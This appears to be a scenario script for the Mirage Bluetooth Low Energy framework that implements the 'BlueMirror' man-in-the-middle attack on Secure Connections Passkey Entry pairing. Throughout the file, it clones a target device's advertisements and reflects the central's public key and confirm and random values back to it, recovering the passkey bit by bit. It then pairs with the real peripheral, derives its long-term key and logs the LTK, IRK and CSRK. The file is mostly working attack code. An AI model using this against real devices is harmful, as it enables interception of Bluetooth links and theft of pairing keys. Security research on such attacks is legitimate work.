from mirage.core import scenario
from mirage.libs import io, ble, utils
from mirage.libs.ble_utils.sc_crypto import CryptoUtils, SCCryptoInstance
from binascii import unhexlify
import struct


class ble_blue_mirror(scenario.Scenario):
    def onStart(self):
        self.module.printScenarioStart("BlueMirror")

        if self.module.args["INTERFACE2"] == "":
            io.fail("This scenario requires two interfaces!")
            self.module.setStage(self.module.BLEStage.STOP)
            return

        # Success status of the scenario
        self.finished = False
        self.success = self.module.ScenarioResult.NOT
        # Local and remote address
        self.localAddress = CryptoUtils.getRandomAddress()
        # Use random address as public identity address
        self.localAddressType = 1
        self.remoteAddress = None
        # For device cloning
        self.addrType = None
        self.intervalMin = None
        self.intervalMax = None
        self.dataAdvInd = None
        self.dataScanRsp = None
        # Crypto Stuff
        self.sc_crypto_slave = SCCryptoInstance()
        self.sc_crypto_master = SCCryptoInstance()

        self.useOOB = False
        self.checkMitm = False
        self.ioCapabilities = False
        self.justWorks = False

        self.pairingMethod = None

        self.pairingRequest = None
        self.pairingResponse = None

        self.remoteAddress = None
        self.remoteAddressType = None
        self.localNonce = None
        self.remoteConfirm = None
        self.localIOCap = None
        self.remoteIOCap = None
        self.pReq = None
        self.pRes = None

        self.failure = False

        self.passkey = 0
        self.currBitIndexMaster = 19
        self.currBitIndex = 19
        self.bitMask = 0b10000000000000000000
        self.rb = 0x00
        # Results
        self.localIRK = None
        self.localCSRK = None
        self.remoteIRK = None
        self.remoteCSRK = None
        # Master confirm value params
        self.nwOrderMasterPubKeyX = None
        self.nwOrderMasterPubKeyY = None
        self.nwOrderMasterLastNonce = None
        self.nwOrderMasterLastConfirmValue = None

        # Scan slave
        io.info("Scanning for slave")
        self.module.setStage(self.module.BLEStage.SCAN)
        self.module.a2sReceiver.setScan(enable=True)
        self.module.waitUntilStage(self.module.BLEStage.IDLE)
        self.module.a2sReceiver.setScan(enable=False)
        # Apply new address at each start
        self.module.a2sEmitter.setAddress(
            self.localAddress, random=self.localAddressType == 1
        )
        # Connect on slave
        io.info("Connect on slave")
        self.module.setStage(self.module.BLEStage.WAIT_CONN)
        self.module.connectOnSlave()
        self.module.waitUntilStage(self.module.BLEStage.IDLE)
        io.info("Cloned slave")
        self.module.startAdvertisingOnEmitter(
            self.module.a2mEmitter,
            self.remoteAddress,
            self.dataAdvInd,
            self.dataScanRsp,
            self.intervalMin,
            self.intervalMax,
            self.addrType,
        )
        return True

    def onEnd(self, result):
        result["success"] = self.success
        result["finished"] = self.finished
        self.module.printScenarioEnd(result)
        self.module.addBlockedPDUsForEmitter(
            emitter=self.module.a2mEmitter, listOfBlockedPDUs=[]
        )
        return True

    def onKey(self, key):
        if key == "esc":
            self.module.setStage(self.module.BLEStage.STOP)

    def onSlaveAdvertisement(self, packet):
        if utils.addressArg(self.module.args["TARGET"]) == packet.addr.upper():
            if packet.type == "ADV_IND":
                io.info("Found corresponding advertisement !")
                self.remoteAddress = utils.addressArg(self.module.args["TARGET"])
                data = packet.getRawDatas()
                self.intervalMin = packet.intervalMin
                self.intervalMax = packet.intervalMax
                self.addrType = packet.addrType
                self.dataAdvInd = data
            elif packet.type == "SCAN_RSP":
                self.dataScanRsp = packet.getRawDatas()
            if self.dataAdvInd != None and self.dataScanRsp != None:
                self.module.setStage(self.module.BLEStage.IDLE)

    def onSlaveConnectionComplete(self, packet):
        self.module.setStage(self.module.BLEStage.IDLE)
        return True

    def onMasterCreateConnection(self, packet):
        io.info("Master connected!")
        io.info("Enable MitM")
        self.module.enableMitM(enable=True)
        return False

    def pairingMethodSelection(self):
        self.secureConnections = (
            self.responderAuthReq.secureConnections
            and self.initiatorAuthReq.secureConnections
        )
        if self.secureConnections:
            io.info("Both devices support LE secure connections")
            self.useOOB = (
                self.pairingRequest.outOfBand and self.pairingResponse.outOfBand
            )
            self.ioCapabilities = (
                self.responderAuthReq.mitm or self.initiatorAuthReq.mitm
            )
            self.justWorks = (
                not self.responderAuthReq.mitm and not self.initiatorAuthReq.mitm
            )

        else:
            io.fail(
                "At least one of the devices doesn't support LE secure connections, Scenario is for SC PassKey Entry!"
            )
            self.failure = True
            self.finished = True
            return None

        io.chart(
            ["Out Of Bond", "IO Capabilities", "Just Works"],
            [
                [
                    "yes" if self.useOOB else "no",
                    "yes" if self.ioCapabilities else "no",
                    "yes" if self.justWorks else "no",
                ]
            ],
        )

        if self.ioCapabilities:
            initiator = "NoInputNoOutput"
            responder = "NoInputNoOutput"
            if self.initiatorInputOutputCapability.data[0] == 0x00:
                initiator = "DisplayOnly"
            elif self.initiatorInputOutputCapability.data[0] == 0x01:
                initiator = "DisplayYesNo"
            elif self.initiatorInputOutputCapability.data[0] == 0x02:
                initiator = "KeyboardOnly"
            elif self.initiatorInputOutputCapability.data[0] == 0x03:
                initiator = "NoInputNoOutput"
            elif self.initiatorInputOutputCapability.data[0] == 0x04:
                initiator = "KeyboardDisplay"

            if self.responderInputOutputCapability.data[0] == 0x00:
                responder = "DisplayOnly"
            elif self.responderInputOutputCapability.data[0] == 0x01:
                responder = "DisplayYesNo"
            elif self.responderInputOutputCapability.data[0] == 0x02:
                responder = "KeyboardOnly"
            elif self.responderInputOutputCapability.data[0] == 0x03:
                responder = "NoInputNoOutput"
            elif self.responderInputOutputCapability.data[0] == 0x04:
                responder = "KeyboardDisplay"

            pairingMethod = ble.PairingMethods.getPairingMethod(
                secureConnections=self.secureConnections,
                initiatorInputOutputCapability=initiator,
                responderInputOutputCapability=responder,
            )

            if pairingMethod != ble.PairingMethods.PASSKEY_ENTRY:
                io.fail("At least one of the devices doesn't support SC PassKey Entry!")
                self.failure = True
                self.finished = True
                return None
            else:
                self.pairingMethod = "PasskeyEntry"
        else:
            io.fail("At least one of the devices doesn't support SC PassKey Entry!")
            self.failure = True
            self.finished = True
            return None

        return self.pairingMethod

    def onMasterPairingConfirm(self, packet):

        self.nwOrderMasterLastConfirmValue = packet.confirm

        io.info("Pairing Confirm (from master) : Reflect to master")
        self.module.a2mEmitter.sendp(ble.BLEPairingConfirm(confirm=packet.confirm))
        return False

    def onMasterPairingRandom(self, packet):

        self.nwOrderMasterLastRandom = packet.random

        io.info("Pairing Random (from master) : Reflect to master")
        self.module.a2mEmitter.sendp(ble.BLEPairingRandom(random=packet.random))

        keyX = CryptoUtils.reverseOrder(self.nwOrderMasterPubKeyX.hex())
        confirm_bit_one = self.sc_crypto_master.generateConfirmValue(
            keyX=keyX,
            remoteKeyX=keyX,
            localNonce=CryptoUtils.reverseOrder(self.nwOrderMasterLastRandom.hex()),
            rbi=b"\x81",
        )
        curr_bit = 0
        if confirm_bit_one == self.nwOrderMasterLastConfirmValue:
            io.info("PassKey Bit is 1")
            curr_bit = 1
        else:
            io.info("PassKey Bit is 0")

        self.passkey = (curr_bit << (19 - self.currBitIndexMaster)) ^ self.passkey
        self.currBitIndexMaster -= 1

        if self.currBitIndexMaster < 0:
            # Master done
            self.module.enableMitM(enable=False)
            if self.module.a2mEmitter.isConnected():
                self.module.a2mEmitter.sendp(ble.BLEDisconnect())

        while not self.sc_crypto_slave.isSharedSecretReady():
            utils.wait(0.2)

        self.module.waitUntilStage(self.module.BLEStage.CUSTOM2)
        nwOrderConfirmValue = self.generateConfirmValue()
        confirmPacket = ble.BLEPairingConfirm(confirm=nwOrderConfirmValue)
        io.info("{}".format(confirmPacket))
        self.module.a2sEmitter.sendp(confirmPacket)
        self.module.setStage(self.module.BLEStage.CUSTOM1)
        return False

    def onSlavePairingConfirm(self, packet):
        io.info("{}".format(packet))
        self.remoteConfirm = packet.confirm
        nwOrderLocalNonce = (
            self.localNonce
            if self.localNonce
            else self.sc_crypto_slave.generateLocalNonce()
        )
        self.module.a2sEmitter.sendp(ble.BLEPairingRandom(random=nwOrderLocalNonce))
        return False

    def onMasterPairingRequest(self, packet):
        self.initiatorKeyDistribution = ble.KeyDistributionFlag(
            data=bytes([packet.initiatorKeyDistribution])
        )
        io.info("{}".format(packet))
        self.pairingRequest = packet
        self.pReq = self.pairingRequest.payload[::-1]

        self.initiatorAuthReq = ble.AuthReqFlag(data=bytes([packet.authentication]))
        self.initiatorInputOutputCapability = ble.InputOutputCapability(
            data=bytes([packet.inputOutputCapability])
        )
        self.initiatorKeyDistribution = ble.KeyDistributionFlag(
            data=bytes([packet.initiatorKeyDistribution])
        )
        self.masterRemoteIOCap = (
            bytes([packet.authentication])
            + (b"01" if packet.outOfBand else b"00")
            + bytes([packet.inputOutputCapability])
        )

        oob = b"\x00"
        self.localIOCap = (
            self.initiatorAuthReq.data + oob + self.initiatorInputOutputCapability.data
        )
        return True

    def onSlavePairingRandom(self, packet):
        io.info("{}".format(packet))
        self.remoteNonce = packet.random
        if self.sc_crypto_slave.verifyConfirmValue(
            self.remoteNonce, self.remoteConfirm, rbi=bytes([self.rb])
        ):
            io.info("Verify Confirm value success!")
        else:
            io.fail("Verify Confirm value failed!")
            self.module.a2sEmitter.sendp(ble.BLEPairingFailed())
            if not self.module.scenarioEnabled:
                self.failure = True

        if self.currBitIndex < 0:
            io.info("Deriving LTK")
            self.sc_crypto_slave.deriveLTKInitiator(
                self.localAddress,
                self.remoteAddress,
                self.localAddressType,
                self.remoteAddressType,
                self.remoteNonce,
            )
            io.info("Sending DH Key Check")
            r = struct.pack("<I", self.passkey)
            io.info(f"Retrieved Passkey: {self.passkey}")
            nwOrderDHKeyCheck = self.sc_crypto_slave.generateDHKeyCheck(
                self.localIOCap,
                self.localAddress,
                self.remoteAddress,
                self.localAddressType,
                self.remoteAddressType,
                self.remoteNonce,
                r,
            )
            packet = ble.BLEDHKeyCheck(dhkey_check=nwOrderDHKeyCheck)
            self.module.a2sEmitter.sendp(packet)

        self.module.setStage(self.module.BLEStage.CUSTOM2)
        return False

    def onSlaveDHKeyCheck(self, packet):
        io.info("{}".format(packet))
        while not self.sc_crypto_slave.isLTKReady():
            utils.wait(0.2)
        r = struct.pack("<I", self.passkey)
        if self.sc_crypto_slave.verifyDHKeyCheck(
            self.remoteIOCap,
            self.localAddress,
            self.remoteAddress,
            self.localAddressType,
            self.remoteAddressType,
            packet.dhkey_check,
            self.remoteNonce,
            r,
        ):
            io.info("DH Key Check success!")
        else:
            io.fail("DH Key Check failed!")
            self.module.a2sEmitter.sendp(ble.BLEPairingFailed())
            if not self.module.scenarioEnabled:
                self.failure = True
        io.info("Try to encrypt link")
        request = ble.BLEStartEncryption(
            rand=b"\x00" * 16, ediv=0, ltk=self.sc_crypto_slave.LTK[::-1]
        )
        io.info("{}".format(request))
        self.module.a2sEmitter.sendp(request)
        return False

    def onSlaveEncryptionChange(self, packet):
        io.info("{}".format(packet))
        if packet.status == 0x00 and packet.enabled == 0x01:
            io.info("Encryption enabled !")
        else:
            io.fail("Slave Encryption failed...")
            if not self.module.scenarioEnabled:
                self.failure = True
        return False

    def onSlavePairingFailed(self, packet):
        io.info("Pairing Failed (from slave) !")
        self.failure = True
        self.finished = True
        return False

    def onSlaveEncryptionInformation(self, packet):
        io.info(
            "Encryption Information (from slave) : Long Term Key = " + packet.ltk.hex()
        )
        return False

    def onSlaveIdentityAddressInformation(self, packet):
        io.info(
            "Identity Address Information (from slave) : address = "
            + str(packet.address)
            + " / type = "
            + packet.type
        )
        return False

    def onSlaveIdentityInformation(self, packet):
        io.info("Identity Information (from slave) : irk = " + packet.irk.hex())
        io.info("Redirecting to master ...")
        return False

    def onSlaveSigningInformation(self, packet):
        io.info("Signing Information (from slave) : csrk = " + packet.csrk.hex())
        io.info("Redirecting to master ...")
        return False

    def onSlavePairingResponse(self, packet):
        self.localAddress = self.module.a2sEmitter.getAddress()
        self.localAddressType = (
            0 if self.module.a2sEmitter.getAddressMode() == "public" else 1
        )

        self.remoteAddress = self.module.a2sEmitter.getCurrentConnection()
        self.remoteAddressType = (
            0 if self.module.a2sEmitter.getCurrentConnectionMode() == "public" else 1
        )

        io.info("{}".format(packet))
        self.pairingResponse = packet
        self.pRes = self.pairingResponse.payload[::-1]

        self.responderAuthReq = ble.AuthReqFlag(data=bytes([packet.authentication]))
        self.responderInputOutputCapability = ble.InputOutputCapability(
            data=bytes([packet.inputOutputCapability])
        )
        self.responderKeyDistribution = ble.KeyDistributionFlag(
            data=bytes([packet.responderKeyDistribution])
        )

        self.pairingMethod = self.pairingMethodSelection()
        if self.pairingMethod:
            io.info("Pairing Method is SC PassKey Entry!")
        else:
            io.fail("Pairing Method is not SC PassKey Entry!")
            self.failure = True
            self.finished = True
            return False

        self.sc_crypto_slave.generateDHKeyPair()
        self.remoteIOCap = (
            format(packet.authentication, "02x")
            + ("01" if packet.outOfBand else "00")
            + format(packet.inputOutputCapability, "02x")
        )
        self.remoteIOCap = unhexlify(self.remoteIOCap)
        return True

    def onSlavePublicKey(self, packet):
        self.sc_crypto_slave.generateDHSharedSecret(packet.key_x, packet.key_y)
        return False

    def onMasterPublicKey(self, packet):
        io.info(
            "Public Key (from master) : Refect it to master and exchange real Public Keys with slave\n"
        )
        self.module.a2mEmitter.sendp(
            ble.BLEPublicKey(
                key_x=packet.key_x,
                key_y=packet.key_y,
            )
        )
        self.nwOrderMasterPubKeyX = packet.key_x
        self.nwOrderMasterPubKeyY = packet.key_y

        (nwOrderPubKeyX, nwOrderPubKeyY) = self.sc_crypto_slave.generateDHKeyPair()
        pubKeyPacket = ble.BLEPublicKey(key_x=nwOrderPubKeyX, key_y=nwOrderPubKeyY)
        self.module.a2sEmitter.sendp(pubKeyPacket)
        self.module.setStage(self.module.BLEStage.CUSTOM2)
        return False

    def generateConfirmValue(self):
        self.localNonce = self.sc_crypto_slave.generateLocalNonce()
        rb = ((self.bitMask >> self.currBitIndex) & self.passkey) >> (
            19 - self.currBitIndex
        )
        self.currBitIndex -= 1
        rb = 0b10000000 ^ rb
        self.rb = rb
        return self.sc_crypto_slave.generateConfirmValue(rbi=bytes([rb]))
